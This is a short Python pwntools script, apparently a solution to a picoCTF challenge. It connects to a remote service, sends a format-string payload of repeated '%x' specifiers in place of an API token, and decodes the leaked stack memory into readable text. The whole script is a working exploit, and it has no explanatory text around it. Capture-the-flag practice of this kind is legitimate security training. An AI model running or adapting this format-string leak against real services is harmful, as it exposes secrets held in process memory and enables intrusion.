from pwn import *
import binascii

host = 'mercury.picoctf.net'
port = 20195

attack_msg = b'%x' * 150
r = remote(host, port)
r.recvuntil(b'2) View my portfolio\n')
r.sendline(b'1')
r.recvuntil(b'What is your API token?\n')
r.sendline(attack_msg)
res = r.recvuntil(b'Portfolio as of')[30:200]
encoded = binascii.unhexlify(res)
for i in range(len(encoded)//4):
    for c in encoded[i*4:i*4+4][::-1]:
        try:
            print(chr(c), end='')
        except:
            continue